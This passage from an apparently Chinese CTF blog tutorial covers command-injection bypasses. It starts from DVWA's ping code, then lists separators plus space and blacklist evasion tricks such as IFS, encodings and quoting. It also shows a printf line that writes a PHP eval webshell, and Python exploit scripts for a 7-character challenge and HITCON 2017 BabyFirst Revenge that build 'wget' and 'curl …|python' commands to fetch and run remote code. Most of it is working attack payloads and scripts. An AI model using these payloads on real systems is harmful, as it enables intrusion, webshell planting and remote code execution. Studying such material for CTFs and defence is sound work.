</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Split the IP into 4 octects </span></span><br><span class="line">    <span class="variable">$octet</span> = explode( <span class="string">&quot;.&quot;</span>, <span class="variable">$target</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer </span></span><br><span class="line">    <span class="keyword">if</span>( ( is_numeric( <span class="variable">$octet</span>[<span class="number">0</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">1</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">2</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">3</span>] ) ) &amp;&amp; ( sizeof( <span class="variable">$octet</span> ) == <span class="number">4</span> ) ) &#123; </span><br><span class="line">        <span class="comment">// If all 4 octets are int&#x27;s put the IP back together. </span></span><br><span class="line">        <span class="variable">$target</span> = <span class="variable">$octet</span>[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">3</span>]; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command. </span></span><br><span class="line">        <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123; </span><br><span class="line">            <span class="comment">// Windows </span></span><br><span class="line">            <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> ); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// *nix </span></span><br><span class="line">            <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> ); </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Ops. Let the user name theres a mistake </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>这里对<code>ip</code>以<code>.</code>分组并检查了是否为数字，增加了更多的过滤，所以没办法使用之前那些<code>trick</code>来进行绕过了。</p>
+<h3 id="常用绕过"><a href="#常用绕过" class="headerlink" title="常用绕过"></a>常用绕过</h3><h4 id="命令分隔与执行多条命令"><a href="#命令分隔与执行多条命令" class="headerlink" title="命令分隔与执行多条命令"></a>命令分隔与执行多条命令</h4><p>在<code>Unix</code>上:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%0a</span><br><span class="line">%0d </span><br><span class="line">;</span><br><span class="line">&amp;</span><br><span class="line">|</span><br><span class="line">$(shell_command)</span><br><span class="line">&#96;shell_command&#96;</span><br><span class="line">&#123;shell_command,&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>Windows</code>上：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%0a</span><br><span class="line">&amp;</span><br><span class="line">|</span><br><span class="line">%1a - 一个神奇的角色，作为.bat文件中的命令分隔符</span><br></pre></td></tr></table></figure>
+
+<p>例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$command</span> = <span class="string">&#x27;dir &#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;dir&#x27;</span>];</span><br><span class="line"><span class="variable">$escaped_command</span> = escapeshellcmd(<span class="variable">$command</span>);</span><br><span class="line">var_dump(<span class="variable">$escaped_command</span>);</span><br><span class="line">file_put_contents(<span class="string">&#x27;out.bat&#x27;</span>,<span class="variable">$escaped_command</span>);</span><br><span class="line">system(<span class="string">&#x27;out.bat&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以利用<code>%1a</code>绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir&#x3D;..&#x2F; %1a whoami</span><br></pre></td></tr></table></figure>
+
+<p>比较老的<code>php</code>版本，如5.2.5及之前可以通过输入多字节来绕过。现在几乎见不到了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">escapeshellcmd(<span class="string">&quot;echo &quot;</span>.chr(<span class="number">0xc0</span>).<span class="string">&quot;;id&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//echo 繺;id</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><ol>
+<li><p>使用<code>&lt;</code>或者<code>&lt;&gt;</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cat&lt;/flag</span><br><span class="line">flag&#123;xxx&#125;</span><br><span class="line"></span><br><span class="line">$ cat&lt;&gt;/flag</span><br><span class="line">flag&#123;xxx&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用<code>IFS</code>或者</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ cat$IFS<span class="variable">$9</span>/flag</span><br><span class="line">flag&#123;xxx&#125;</span><br><span class="line"></span><br><span class="line">$ cat<span class="variable">$&#123;IFS&#125;</span>/flag</span><br><span class="line">flag&#123;xxx&#125;</span><br><span class="line"></span><br><span class="line">$ cat<span class="variable">$IFS</span>/flag</span><br><span class="line">flag&#123;xxx&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在<code>url</code>的编码绕过</p>
+<p>这里我<code>fuzz</code>了一下，<code>Linux bash</code>可以使用<code>%20(space)</code>、<code>%09(tab)</code>、<code>%3c(&lt;)</code>以及<code>+</code>来绕过</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fylfbbt1n2j21yy1964ki.jpg"></p>
+</li>
+<li><p>花括号拓展<code>&#123;OS_COMMAND,ARGUMENT&#125;</code></p>
+<p>在<code>Linux bash</code>中还可以使用<code>&#123;cat,/etc/passwd&#125;</code>来绕过</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fylhtmzibwj210w0lynmy.jpg"></p>
+</li>
+<li><p>变量控制</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ X=$<span class="string">&#x27;cat\x20/flag&#x27;</span>&amp;&amp;<span class="variable">$X</span></span><br><span class="line">flag&#123;xxx&#125;</span><br><span class="line"></span><br><span class="line">$ X=$<span class="string">&#x27;cat\x09/flag&#x27;</span>&amp;&amp;<span class="variable">$X</span></span><br><span class="line">flag&#123;xxx&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#这里\x3c不可以</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>采用<code>$@</code>绕过</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ c<span class="variable">$@at</span> /fl<span class="variable">$@ag</span></span><br><span class="line">flag&#123;xxx&#125;</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">echo</span> i<span class="variable">$@d</span></span><br><span class="line">id</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">echo</span> i<span class="variable">$@d</span>|<span class="variable">$0</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+</li>
+</ol>
+<h4 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h4><ol>
+<li><p>采用变量</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ a=l;b=s;$a<span class="variable">$b</span></span><br><span class="line">bin  boot  dev	etc  home  lib	lib64  media  mnt  opt	proc  root  run  sbin  srv  sys  tmp  usr  var</span><br><span class="line"></span><br><span class="line">$ a=c;b=at;c=flag;$a<span class="variable">$b</span> <span class="variable">$c</span></span><br><span class="line">flag&#123;xxx&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>编码绕过</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;Y2F0IC9mbGFn&quot;</span>|base64 -d|bash</span><br><span class="line">flag&#123;xxx&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#base64_endcode(&quot;cat /flag&quot;) =&gt; Y2F0IC9mbGFn</span></span><br><span class="line"><span class="comment">#base64可能会出现/</span></span><br><span class="line"></span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;636174202f666c6167&quot;</span> | xxd -r -p|bash	<span class="comment">#hex</span></span><br><span class="line">flag&#123;xxx&#125;</span><br><span class="line"></span><br><span class="line">$ $(<span class="built_in">printf</span> <span class="string">&quot;\154\163&quot;</span>)							<span class="comment">#oct</span></span><br><span class="line">bin  boot  dev	etc  flag  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br><span class="line"></span><br><span class="line">$ $(cat /flag)</span><br><span class="line">bash: flag&#123;xxx&#125;: 未找到命令</span><br><span class="line"></span><br><span class="line">$ $(<span class="built_in">printf</span> <span class="string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>)</span><br><span class="line">flag&#123;xxx&#125;</span><br><span class="line"></span><br><span class="line">$ &#123;<span class="built_in">printf</span>,<span class="string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>&#125;|<span class="variable">$0</span></span><br><span class="line">flag&#123;xxx&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#可以通过这样来写webshell,内容为&lt;?php @eval($_POST[&#x27;c&#x27;]);?&gt;</span></span><br><span class="line">$ &#123;<span class="built_in">printf</span>,<span class="string">&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;</span>&#125; &gt;&gt; 1.php</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>单引号双引号</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ c<span class="string">&quot;a&quot;</span>t /f<span class="string">&#x27;&#x27;</span>l<span class="string">&#x27;a&#x27;</span>g</span><br><span class="line">flag&#123;xxx&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>反斜线</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ c\a\t /f\l\ag</span><br><span class="line">flag&#123;xxx&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用已经存在的资源</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">echo</span> <span class="variable">$PATH</span>| cut -c 1</span><br><span class="line">/</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用一些已有字符</p>
+<ul>
+<li>${PS2} 对应字符 <code>&gt;</code></li>
+<li>${PS4} 对应字符 <code>+</code></li>
+<li>${IFS} 对应 内部字段分隔符</li>
+<li>${9} 对应 空字符串</li>
+</ul>
+</li>
+</ol>
+<h3 id="举个🌰-1"><a href="#举个🌰-1" class="headerlink" title="举个🌰"></a>举个🌰</h3><h4 id="短命令执行"><a href="#短命令执行" class="headerlink" title="短命令执行"></a>短命令执行</h4><p>首先按照前面的<code>&gt;</code>的用法，我们可以知道有标准输出可以输出到文件，所以</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fylohigzelj20di03udhe.jpg"></p>
+<p>这里我们有两种构造方式:</p>
+<ol>
+<li><p>只用<code>\</code>分行输入，这个优点是可以不用考虑时间顺序，直接用<code>ls&gt;a</code>输出到<code>a</code>文件，这里可能有一点误解，这里是输入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ &gt;ec\</span><br><span class="line">ho\</span><br><span class="line">\ 1</span><br><span class="line"><span class="comment">#这个方法前面不需要加&gt;，最后用\转义空格</span></span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ol>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fylpd2xpc2j20f609yafw.jpg"></p>
+<ol start="2">
+<li>使用<code>\\</code>，这种方法是利用<code>\</code>来拼接字符串，其中前一个<code>\</code>是用来转义后一个<code>\</code>的。这里需要考虑时间顺序，需要逆序来创建文件。</li>
+</ol>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fylp50us2bj20fq0bwdm1.jpg"></p>
+<h4 id="Example-1-七字绕过"><a href="#Example-1-七字绕过" class="headerlink" title="Example 1    七字绕过"></a>Example 1    七字绕过</h4><p>这里是个p牛出的题</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$_GET</span>[<span class="number">1</span>])&lt;<span class="number">8</span>)&#123;</span><br><span class="line">     <span class="keyword">echo</span> shell_exec(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以分别通过发送</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">?1&#x3D;&gt;hp</span><br><span class="line">?1&#x3D;&gt;ell.p\\</span><br><span class="line">?1&#x3D;&gt;\ sh\\</span><br><span class="line">?1&#x3D;&gt;\ -O\\</span><br><span class="line">?1&#x3D;&gt;com\\</span><br><span class="line">?1&#x3D;&gt;x.\\</span><br><span class="line">?1&#x3D;&gt;\ xx\\</span><br><span class="line">?1&#x3D;&gt;wget\\</span><br><span class="line">?1&#x3D;ls -t&gt;a</span><br><span class="line">?1&#x3D;sh a</span><br></pre></td></tr></table></figure>
+
+<p>也就是我们上述的第二个方法写入一个<code>a</code>文件，其中<code>xxx.com</code>可以替换为自己的域名，但是这里要注意，不能以<code>.</code>开头，因为<code>ls -t&gt;a</code>无法将隐藏文件名写入<code>a</code>。</p>
+<p>贴一下p牛的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*- </span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetShell</span>():</span></span><br><span class="line">    url = <span class="string">&quot;http://192.168.56.129/shell.php?1=&quot;</span></span><br><span class="line">    fileNames = [<span class="string">&quot;1.php&quot;</span>,<span class="string">&quot;-O\ \\&quot;</span>,<span class="string">&quot;cn\ \\&quot;</span>,<span class="string">&quot;\ a.\\&quot;</span>,<span class="string">&quot;wget\\&quot;</span>] </span><br><span class="line">    <span class="comment"># linux创建中间有空格的文件名，需要转义，所以有请求&quot;cn\ \\&quot;</span></span><br><span class="line">    <span class="comment"># 可以修改hosts文件，让a.cn指向一个自己的服务器。</span></span><br><span class="line">    <span class="comment"># 在a.cn 的根目录下创建index.html ，内容是一个php shell </span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> fileName <span class="keyword">in</span> fileNames:</span><br><span class="line">        createFileUrl = url+<span class="string">&quot;&gt;&quot;</span>+fileName</span><br><span class="line">        <span class="built_in">print</span> createFileUrl </span><br><span class="line">        requests.get(createFileUrl)</span><br><span class="line"> </span><br><span class="line">    getShUrl = url + <span class="string">&quot;ls -t&gt;1&quot;</span></span><br><span class="line">    <span class="built_in">print</span> getShUrl</span><br><span class="line">    requests.get(getShUrl)</span><br><span class="line">    getShellUrl = url + <span class="string">&quot;sh 1&quot;</span></span><br><span class="line">    <span class="built_in">print</span> getShellUrl</span><br><span class="line">    requests.get(getShellUrl)</span><br><span class="line"> </span><br><span class="line">    shellUrl = <span class="string">&quot;http://192.168.56.129/1.php&quot;</span></span><br><span class="line">    response = requests.get(shellUrl)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[*] Get shell !&quot;</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[*] fail!&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    GetShell()</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="Example-2-五字绕过-HITCON-CTF-2017-BabyFirst-Revenge"><a href="#Example-2-五字绕过-HITCON-CTF-2017-BabyFirst-Revenge" class="headerlink" title="Example 2    五字绕过    [HITCON CTF 2017-BabyFirst Revenge]"></a>Example 2    五字绕过    [HITCON CTF 2017-BabyFirst Revenge]</h4><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;/www/sandbox/&#x27;</span> . md5(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    @chdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;reset&#x27;</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . <span class="variable">$sandbox</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这里需要我们注意的是<code>cmd &lt;= 5</code>，所以我们就不能在使用<code>ls -t&gt;a</code>。</p>
+<p>但是我们还是可以通过比较巧妙的构造来实现<code>ls -t&gt;a</code>这么一个操作的。可以先通过把<code>ls -t&gt;a</code>这样拆分成几段写入到<code>_</code>文件存放。</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fymd36mystj20ey0fcjz2.jpg"></p>
+<p>从图中我们就可以看到<code>_</code>里面的内容，第一行无效命令，2-5行因为末尾有<code>\</code>连接字符的存在所以可以连接字符串形成<code>ls -t&gt;g</code>，最后一行执行<code>ls</code>。所以<code>sh _</code>我们可以得到当前目录<code>ls -t&gt;g</code>的效果。达到与<code>Example 1</code>一致的效果，其他步骤与<code>Example 1</code>类似，就不再赘述了。下面给出<code>Orange</code>的<code>exp</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate `ls -t&gt;g` file</span></span><br><span class="line">    <span class="string">&#x27;&gt;ls\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;ls&gt;_&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;\ \\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;-t\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;\&gt;g&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;ls&gt;&gt;_&#x27;</span>, </span><br><span class="line">    <span class="comment"># generate `curl orange.tw.tw&gt;python`</span></span><br><span class="line">    <span class="comment"># curl shell.0xb.pw|python</span></span><br><span class="line">    <span class="string">&#x27;&gt;on&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;th\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;py\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;\|\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;pw\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;x.\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;xx\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;l.\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;el\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;sh\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;\ \\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;rl\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;cu\\&#x27;</span>, </span><br><span class="line">    <span class="comment"># exec</span></span><br><span class="line">    <span class="string">&#x27;sh _&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;sh g&#x27;</span>, </span><br><span class="line">]</span><br><span class="line"><span class="comment"># r = requests.get(&#x27;http://localhost/tmp/?reset=1&#x27;)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(i) &lt;= <span class="number">5</span> </span><br><span class="line">    r = requests.get(<span class="string">&#x27;http://localhost/tmp/?cmd=&#x27;</span> + quote(i) )</span><br><span class="line">    <span class="built_in">print</span> i</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>相关Writeup:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://chybeta.github.io/2017/11/04/HITCON-CTF-2017-BabyFirst-Revenge-writeup/">HITCON CTF 2017-BabyFirst Revenge-writeup</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.jianshu.com/p/82788b6949c7">HITCON CTF 2017-BabyFirst Revenge-writeup (Via curl)</a></li>
+<li><a target="_blank" rel="noopener" href="https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/">HITCON 2017 CTF BabyFirst Revenge</a></li>
+<li><a target="_blank" rel="noopener" href="https://kimtruth.github.io/2017/11/06/HITCON-CTF-2017-BabyFirst-Revenge-172-pts/">HITCON CTF 2017 - BabyFirst Revenge (172 pts.)</a></li>
+<li><a target="_blank" rel="noopener" href="https://theromanxpl0it.github.io/ctf_hitcon2017/babyrevenge/">Hitcon CTF 2017 - Baby Revenge</a></li>
+<li><a target="_blank" rel="noopener" href="https://losfuzzys.github.io/writeup/2017/11/06/hitconctf-babyfirstrevenge/">Hitcon CTF 2017 Quals: Baby First Revenge (web 172) (Via xxd)</a></li>
+<li><a target="_blank" rel="noopener" href="https://findneo.github.io/2017/11/HITCON-CTF-2017-Babyfirst-Revenge-series-writeup/">HITCON CTF 2017 BabyFirst Revenge &amp; v2 writeup</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/n4p5ter/BabyFirst-Revenge-HITCOIN-2017-QUALS">BabyFirst-Revenge-HITCOIN-2017-QUALS by @n4p5ter</a></li>
+</ul>
+<h4 id="Example-3-四字绕过-HITCON-2017-BabyFirst-Revenge-v2"><a href="#Example-3-四字绕过-HITCON-2017-BabyFirst-Revenge-v2" class="headerlink" title="Example 3    四字绕过    [HITCON 2017 BabyFirst Revenge v2]"></a>Example 3    四字绕过    [HITCON 2017 BabyFirst Revenge v2]</h4><p>源码：</p>
